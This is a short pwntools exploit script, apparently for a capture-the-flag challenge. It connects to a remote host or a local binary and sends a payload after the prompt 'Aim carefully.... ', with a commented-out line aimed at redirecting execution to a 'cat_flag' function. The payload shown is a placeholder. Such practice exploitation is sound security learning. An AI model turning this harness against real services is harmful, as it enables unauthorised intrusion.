from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="Host to connect to")
parser.add_argument("--binary", help="Binary to execute")
args = parser.parse_args()

def get_addr(func):
    return hex(elf.symbols[func])

def hex_to_int(hex):
    return int(hex, 16)

def exploit():
    payload = b""
    #payload += get_addr("cat_flag").encode()
    payload += b"0xdeadbeef"
    p.recvuntil(b"Aim carefully.... ")
    p.sendline(payload)
    print(p.recvall())

global p
if args.ip:
    ip = args.ip.split(":")[0]
    port = args.ip.split(":")[1]
    p = remote(ip, port)
elif args.binary:
    global elf, rop
    elf = ELF(args.binary)
    rop = ROP(elf)
    p = elf.process()
else:
    exit()
    

exploit()
